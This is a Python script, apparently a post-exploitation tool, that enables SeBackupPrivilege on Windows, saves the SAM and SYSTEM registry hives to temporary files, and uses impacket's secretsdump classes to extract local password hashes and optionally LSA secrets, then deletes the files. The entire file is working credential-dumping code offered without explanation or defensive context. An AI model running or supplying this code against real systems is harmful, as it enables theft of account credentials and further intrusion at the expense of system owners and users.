import logging, os
from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
import winreg, win32security, win32api

class DumpSecrets:
    def __init__(self, system='', sam='', security=''):
        self.__lmhash = ''
        self.__nthash = ''
        self.__history = ''
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = system
        self.__bootkey = None
        self.__securityHive = security
        self.__samHive = sam
        self.__noLMHash = True
        self.__isRemote = False
        self.__canProcessSAMLSA = True

    def dump(self):
        if self.__systemHive and self.__samHive:
            try:
                localOperations = LocalOperations(self.__systemHive)
                bootKey = localOperations.getBootKey()
                SAMFileName = self.__samHive
                self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                self.__SAMHashes.dump()
            except Exception as e:
                logging.error('SAM hashes extraction failed: %s' % str(e))
        if self.__securityHive:
            SECURITYFileName = self.__securityHive
            self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote=self.__isRemote, history=self.__history)
            self.__LSASecrets.dumpCachedHashes()
            self.__LSASecrets.dumpSecrets()
        self.cleanup()

    def cleanup(self):
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()

def acquire_privilege(privilege):
    try:
        process = win32api.GetCurrentProcess()
        token = win32security.OpenProcessToken(
            process,
            win32security.TOKEN_ADJUST_PRIVILEGES |
            win32security.TOKEN_QUERY)
        priv_luid = win32security.LookupPrivilegeValue(None, privilege)
        privilege_enable = [(priv_luid, win32security.SE_PRIVILEGE_ENABLED)]
        privilege_disable = [(priv_luid, win32security.SE_PRIVILEGE_REMOVED)]
        win32security.AdjustTokenPrivileges(token, False, privilege_enable)
    except OSError as err:
        print("[-] Failed to acquire %s privilege: %s" %(privilege, err))
        exit()

def main():
    acquire_privilege("SeBackupPrivilege")
    
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SAM') as handle:
        try:
            winreg.SaveKey(handle, 'sa.tmp')
        except OSError as err:
            print("[-] Failed to dump SAM:", err)
            os.remove("sa.tmp")
            exit()
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM') as handle:
        try:
            winreg.SaveKey(handle, 'sy.tmp')
        except OSError as err:
            print("[-] Failed to dump SYSTEM:", err)
            os.remove("sy.tmp")
            exit()
            
    system = "sy.tmp"
    sam = "sa.tmp"
    dumper = DumpSecrets(system, sam, None)
    dumper.dump()
    os.remove("sa.tmp")
    os.remove("sy.tmp")

if __name__ == '__main__':
    main()
